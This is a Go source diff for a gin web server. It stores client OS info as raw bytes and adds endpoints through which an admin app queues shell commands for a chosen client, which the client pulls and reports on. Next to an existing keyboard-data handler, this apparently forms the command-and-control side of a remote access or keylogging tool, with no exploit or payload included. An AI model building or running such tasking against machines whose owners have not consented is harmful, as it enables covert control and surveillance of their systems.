@@ -1,6 +1,7 @@
 package utils
 
 import (
+	"fmt"
 	"io"
 	"net/http"
 	"strconv"
@@ -87,19 +88,23 @@ func AddClient(c * gin.Context) {
 
 func UpdateClientOsInfo(c * gin.Context) {
 
-	os_info := types.OSInfo{}
-	ReadRequestDataAsType(&os_info, &c.Request.Body)
-	
 	addr := GetClientIPAddress(c)
 
 	if (FindClientByIpAddrDB(DB, addr) == nil) {
 		c.String(http.StatusNotFound, "404, no such client")
 		return
 	}
-	
-	ClientsOSInfos.Store(addr, &os_info)
 
-	c.String(http.StatusOK, "operating system info updated")
+	bytes, err := io.ReadAll(c.Request.Body)
+	// failed to read request body.
+	if (err != nil) {
+		c.String(http.StatusInternalServerError, "")
+		return
+	}
+
+	// store pointer to deflated data in hashtable
+	ClientsOSInfos.Store(addr, &bytes)
+	c.String(http.StatusOK, "")
 }
 
 func GetClientOSInfo(c * gin.Context) {
@@ -114,9 +119,14 @@ func GetClientOSInfo(c * gin.Context) {
 	value, ok := ClientsOSInfos.Load(addr)
 
 	if (!ok) {
-		c.JSON(http.StatusNotFound, nil)
+		c.String(http.StatusNotFound, "")
 	} else {
-		c.JSON(http.StatusOK, value)
+		c.Header("Content-Type", "application/json")
+		c.Header("Content-Encoding", "deflate")
+
+		bytes := value.(*[]byte)
+		c.Status(http.StatusOK)
+		c.Writer.Write(*bytes)
 	}
 
 }
@@ -459,4 +469,121 @@ func GetClientKeyboardData(c * gin.Context) {
 
 	}
 
+}
+
+var ShellCommander = types.ShellCommander{}
+
+// adds command to client queue, to be executed (called by admin app)
+//
+// - 404 if no client found
+// - 204 if command pushed to client's queue
+func EnqueueShellCommand(c * gin.Context) {
+
+	addr := c.Param("client_addr")
+
+	if (FindClientByIpAddrDB(DB, addr) == nil) {
+		c.String(http.StatusNotFound, "")
+		return
+	}
+
+ 	var cmd types.Command
+	ReadRequestDataAsType(&cmd, &c.Request.Body)
+
+	ShellCommander.ShellCommanderEnqCommand(&cmd, addr)
+	fmt.Printf("Enque: Queue Size for client %s is %d\n", addr, ShellCommander.ShellCommanderGetSize(addr))
+	c.String(http.StatusNoContent, "")
+
+}
+
+// removes first command from queue (called by admin app)
+// - 404 if no client found
+// - 204 if command was removed
+func DequeueShellCommand(c * gin.Context) {
+
+	addr := c.Param("client_addr")
+
+	if (FindClientByIpAddrDB(DB, addr) == nil) {
+		c.String(http.StatusNotFound, "no such client exist")
+		return
+	}
+
+	if (ShellCommander.ShellCommanderDeqCommand(addr)) {
+		fmt.Printf("Deque: Queue Size for client %s is %d\n", addr, ShellCommander.ShellCommanderGetSize(addr))
+
+		c.String(http.StatusNoContent, "")
+	} else {
+		c.String(http.StatusNotFound, "queue for such client does not exist")
+	}
+}
+
+// update's state of oldest command (called by client only)
+func UpdateHeadShellCommand(c * gin.Context) {
+
+	addr := GetClientIPAddress(c)
+
+	if (FindClientByIpAddrDB(DB, addr) == nil) {
+		c.String(http.StatusNotFound, "no such client exist")
+		return
+	}
+
+	var newCmdState types.Command
+	ReadRequestDataAsType(&newCmdState, &c.Request.Body)
+	ShellCommander.UpdateFirst(addr, &newCmdState)
+	c.String(http.StatusNoContent, "updated")
+}
+
+
+// retrieve oldest (first) command from queue (called by admin)
+func PullHeadShellCommand(c * gin.Context) {
+	
+	addr := c.Param("client_addr")
+
+	if (FindClientByIpAddrDB(DB, addr) == nil) {
+		c.String(http.StatusNotFound, "no such client exist")
+		return
+	}
+
+	cmd := ShellCommander.ShellCommanderFirst(addr)
+
+	if (cmd == nil) {
+		c.String(http.StatusNotFound, "queue not found or empty")
+		return
+	}
+
+
+	c.JSON(http.StatusOK, cmd)
+}
+
+// retrieve oldest (first) command from queue (called by client)
+func PullHeadShellCommandC(c * gin.Context) {
+	
+	addr := GetClientIPAddress(c)
+
+	if (FindClientByIpAddrDB(DB, addr) == nil) {
+		c.String(http.StatusNotFound, "no such client exist")
+		return
+	}
+
+	cmd := ShellCommander.ShellCommanderFirst(addr)
+
+	if (cmd == nil) {
+		c.String(http.StatusNotFound, "queue not found or empty")
+		return
+	}
+
+
+	c.JSON(http.StatusOK, cmd)
+}
+
+func ClearClientCommandQueue(c * gin.Context) {
+	addr := c.Param("client_addr")
+
+	if (FindClientByIpAddrDB(DB, addr) == nil) {
+		c.String(http.StatusNotFound, "no such client exist")
+		return
+	}
+
+	ShellCommander.Clear(addr)
+
+	c.JSON(http.StatusNoContent, nil)
 }
